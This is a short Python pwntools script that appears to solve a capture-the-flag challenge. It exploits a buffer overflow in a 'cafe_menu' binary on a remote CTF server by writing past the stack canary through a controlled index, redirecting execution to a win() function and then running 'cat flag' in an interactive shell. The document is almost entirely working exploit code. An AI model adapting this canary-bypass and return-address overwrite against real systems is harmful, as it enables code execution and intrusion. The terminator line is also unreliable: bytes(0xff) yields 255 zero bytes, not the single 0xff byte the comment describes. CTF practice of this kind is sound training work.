#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        NO PIE enabled  =>  addresses are static and can be used directly in the exploit

elf = context.binary = ELF('./cafe_menu', checksec=False)
OFFSET_TO_CANARY = 56   # 48 bytes for the buffer + 4 bytes for the index + 4 bytes for alignment (struct aligns its size to nearest multiple of 8)
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP
win_addr = 0x401262

p = remote("offsec.m0lecon.it", 13503)

p.recvuntil(b"Enter today's specials (send 0xff to finish):\n")

payload = flat(
    b"A" * 48,    # 48 bytes for the buffer
    bytes([OFFSET_TO_RIP - 1]),  # send the index to overwrite the return address (OFFSET_TO_RIP - 1 because the program increments the index before writing in the next cycle)
    p64(win_addr),  # overwrite the RIP with the address of the win() function
    bytes(0xff)    # send 0xff to signal input termination (as required by the program)
)

p.send(payload)

p.sendline(b"cat flag")

p.interactive()
